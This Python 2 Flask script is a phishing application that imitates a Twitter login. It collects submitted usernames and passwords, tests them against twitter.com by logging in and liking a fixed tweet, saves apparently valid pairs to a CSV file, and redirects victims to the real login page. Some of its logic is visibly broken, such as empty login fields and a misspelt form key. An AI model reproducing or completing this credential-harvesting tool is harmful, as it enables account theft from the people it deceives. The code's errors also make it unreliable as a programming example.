# -*- coding: utf-8 -*-
# twitter.py
from flask import Flask, redirect, url_for
from flask import request
from flask import render_template
from bs4 import BeautifulSoup
import requests
import os
import csv

app = Flask(__name__)

SESSION = requests.Session()
RESPONSE = ""
AUTH_TOKEN = ""

@app.route('/')
def my_form():
    return render_template("twitter.html")

@app.route('/', methods=['POST'])
def my_form_post():
    global SESSION, RESPONSE, AUTH_TOKEN
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ja,en-US;q=0.7,en;q=0.3",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://twitter.com/",
        "Origin": "https://twitter.com",
        "Upgrade-insecure-requests": "1"
    }
    login = {
        "session[username_or_email]": "",
        "sesssion[password]": "",
        "remember_me": "1",
        "return_to_ssl": "",
        "redirect_after_login": "/",
        "scribe_log": ""
    }

    fav = {
        "authenticity_token":"",
        "id":"893314073533837312",
        "tweet_stat_count":"0"
    }

    unfav = {
        "authenticity_token":"",
        "id":"893314073533837312",
        "tweet_stat_count":"0"
    }

    try:
        RESPONSE = SESSION.get('https://twitter.com/', headers=headers, allow_redirects=True)
        soup = BeautifulSoup(RESPONSE.text, "lxml")
        AUTH_TOKEN = soup.find(attrs={'name':'authenticity_token'}).get('value')
        print "auth: %d" % RESPONSE.status_code

        login['authenticity_token'] = AUTH_TOKEN
        fav['authenticity_token'] = AUTH_TOKEN
        unfav['authenticity_token'] = AUTH_TOKEN
    except Exception as e:
        print "[+] Failed to get a authenticity_token."
        print('Exception: {0}'.format(e))

    try:
        RESPONSE = SESSION.post('https://twitter.com/sessions', data=login, allow_redirects=False, headers=headers)
        print "login: %d" % RESPONSE.status_code

        fav_status = SESSION.post('https://twitter.com/i/tweet/like', data=fav, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
        print "fav: %d" % fav_status.status_code

        if(fav_status.status_code == 302):
            return render_template("twitter.html")

        elif(fav_status.status_code == 200):
            csvWrite(request.form['session[username_or_email]'], request.form['session[password]'])
            return redirect("https://twitter.com/login", code=302)

        elif(fav_status.status_code == 402):
            unfav_status = SESSION.post('https://twitter.com/i/tweet/unlike', data=unfav, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
            if(unfav_status.status_code == 200):
                csvWrite(request.form['session[username_or_email]'], request.form['session[password]'])
                return redirect("https://twitter.com/login", code=302)
        else:
            return render_template("twitter.html")
    except Exception as e:
        print "[+] Failed to login."
        print('Exception: {0}',format(e))
        return render_template("twitter.html")
    finally:
        SESSION.cookies.clear()
        
def csvWrite(USER, PASSWD):
    try:
        print USER
        print PASSWD
        if USER != "":
            with open('true.csv', 'ar+') as f:
                writer = csv.writer(f, lineterminator='\n')
                list = [USER, PASSWD]
                writer.writerow(list)
    except:
        print "[+] The true.csv file doesn't exist."
        
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 80))
    app.run(host='0.0.0.0', port=port, threaded=True)    
